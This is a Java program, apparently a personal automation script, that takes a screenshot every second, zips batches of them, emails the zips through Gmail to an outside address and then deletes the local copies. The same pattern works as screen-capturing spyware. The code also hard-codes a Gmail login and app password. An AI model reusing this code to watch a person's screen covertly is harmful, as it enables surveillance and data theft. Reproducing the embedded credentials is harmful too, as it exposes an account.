package automating.other.things;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.imageio.ImageIO;

import org.apache.commons.mail.DefaultAuthenticator;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

import net.lingala.zip4j.ZipFile;

public class CaptureSSMail {

	public static void main(String[] args) throws InterruptedException, EmailException {
		BufferedImage image;
		List<File> imageList = new ArrayList<>();
		int i = 0, time = 0;
		while (time <= 20) {
			Date date = new Date();
			String dtstamp = new SimpleDateFormat("yyyyMMddHHmmss").format(date);
			try {
				// This will capture screenshot of current screen
				image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
				// This will store screenshot on Specific location
				File img = new File("C:\\Users\\anisingh12\\Pictures\\CaptureSS\\screenshot-" + dtstamp + ".png");
				imageList.add(img);
				ImageIO.write(image, "png", img);

				if (i == 10) {
					i = 0;
					ZipFile zipFile = new ZipFile(
							"C:\\Users\\anisingh12\\Pictures\\CaptureSS\\zip" + (time / 10) + ".zip");
					zipFile.addFiles(imageList);
					zipFile.close();
					imageList.clear();
					
					// Apache commons maven dependency
					MultiPartEmail email = new MultiPartEmail();
					email.setHostName("smtp.gmail.com");
					email.setSmtpPort(465);
					email.setAuthenticator(new DefaultAuthenticator("singhaniket150101@gmail.com", "dvtfmdtnvucmojlt"));
					email.setSSLOnConnect(true);
					email.setFrom("singhaniket150101@gmail.com");
					email.setSubject("Zip " + (time / 10));
					email.setMsg("Activity Recorded");
					email.addTo("memyselfpro@gmail.com");

					// add the attachment
					email.attach(new File("C:\\Users\\anisingh12\\Pictures\\CaptureSS\\zip" + (time / 10) + ".zip"));
					System.out.println("SENDING Zip " + (time/10));
					// send the email and delete the files
					String msg = email.send();
					if (msg.length() > 0) {
						System.out.println("Zip " + (time/10) + " SENT");
						File[] files = new File("C:\\Users\\anisingh12\\Pictures\\CaptureSS").listFiles();
						for (File fil : files) {
							fil.delete();
						}
					}
				}

			} catch (IOException e) {
				e.printStackTrace();
			} catch (HeadlessException e1) {
				e1.printStackTrace();
			} catch (AWTException e1) {
				e1.printStackTrace();
			}
			Thread.sleep(1000);
			i++;
			time++;
		}
	}
}
